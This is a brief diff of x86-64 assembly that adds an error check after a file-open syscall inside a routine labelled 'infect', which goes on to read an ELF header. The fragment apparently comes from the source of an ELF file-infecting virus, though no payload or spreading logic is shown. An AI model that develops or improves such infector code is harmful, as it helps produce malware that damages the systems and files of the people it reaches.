@@ -424,6 +424,9 @@ infect:
     mov rsi, rbx
     mov rax, rbx
     syscall
+    ; Check if the file was opened successfully.
+    bt eax, 31
+    jb .cleanup
     ; Read the ELF header.
     mov r8d, eax
     lea rsi, [rsp - 112]
